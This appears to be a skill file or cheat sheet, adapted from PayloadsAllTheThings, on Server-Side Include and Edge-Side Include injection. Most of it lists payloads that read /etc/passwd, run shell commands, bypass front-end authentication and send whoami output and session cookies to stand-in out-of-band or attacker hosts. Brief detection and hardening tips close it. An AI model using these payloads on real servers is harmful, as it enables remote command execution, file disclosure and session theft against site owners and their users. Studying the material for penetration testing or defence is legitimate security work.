---
name: server-side-include-injection
description: Exploit SSI (Apache Server-Side Includes) and ESI (Edge-Side Includes) directives reflected into responses to read files, run commands, and exfiltrate cookies
domain: cybersecurity
subdomain: web-application-security
tags: [ssi, esi, server-side-include, edge-side-include]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/Server Side Include Injection
---

# SSI / ESI Injection

## Overview
**SSI** (Apache `mod_include`, IIS) processes `<!--#... -->` directives in `.shtml`/`.shtm` pages. **ESI** (Varnish, Akamai, Fastly, Squid) processes `<esi:...>` tags in cached responses. Either lets attackers run commands or include arbitrary files when input lands in a processed page.

## SSI Payloads
```
<!--#echo var="DATE_LOCAL" -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="../../../../etc/passwd" -->
<!--#exec cmd="id" -->
<!--#exec cmd="curl http://OOB/$(whoami)" -->
<!--#config errmsg="..." -->
<!--#fsize file="x" -->
```
Requires the response to be served with SSI enabled (`Options +Includes`, AddType .shtml). Inject via user input reflected into a .shtml page.

## ESI Payloads (Cache Edge)
```
<esi:include src="http://attacker/x" />
<esi:include src="/admin/secret" />     ← bypass front-end auth (ESI fetches with proxy credentials)
<esi:vars>$(HTTP_COOKIE)</esi:vars>     ← exfil cookies to logs / next include
<esi:assign name="x" value="$(HTTP_COOKIE)"/>
<esi:include src="http://OOB/?d=$(HTTP_COOKIE{SESSION})"/>
```

### Cache poisoning + ESI XSS
- Some ESI implementations support inline scripts → server-side XSS without CSP applying.
- Akamai ESI 1.0 vs Varnish vs Fastly: feature support differs — fingerprint first.

## Detection
- Reflect `<!--#printenv -->` and look for environment listing in response.
- For ESI: send `<esi:include src="//OOB/x" />` via reflected input, watch for OOB hit.
- Tool: **esi-injection-poc** scripts.

## Hardening
- Disable SSI on production (`Options -Includes`).
- Encode user input that lands in cached HTML; never reflect raw `<` `>`.
- For Varnish: only enable ESI on specific trusted backends.

## References
- `payloadsallthethings/Server Side Include Injection/README.md`
- "Beyond XSS: ESI Injection" — GoSecure.
